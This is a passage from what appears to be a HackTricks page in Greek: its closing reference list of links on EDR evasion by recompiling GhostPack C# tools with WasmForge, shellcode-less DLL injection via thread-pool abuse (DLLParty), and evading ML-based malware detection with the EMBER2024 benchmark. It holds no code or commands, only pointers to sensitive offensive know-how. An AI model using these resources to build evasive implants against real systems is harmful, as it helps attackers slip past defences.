- [44] [Praetorian - GhostPack Necromancy: Ανακατασκευή εργαλείων C# με WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Μεταγλώττιση έργων C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [Proof-of-concept και πηγαίος κώδικας του DLLParty](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Κατάχρηση των internals του thread pool για injection DLL χωρίς shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Σύνολο δεδομένων benchmark EMBER2024 και εργαλεία thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Χρήση του EMBER2024 για την αξιολόγηση red team implants](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Αποφυγή ανιχνεύσεων που βασίζονται σε machine learning](https://msecops.de/blog/posts/ml-evasion/)
{{#include ../banners/hacktricks-training.md}}
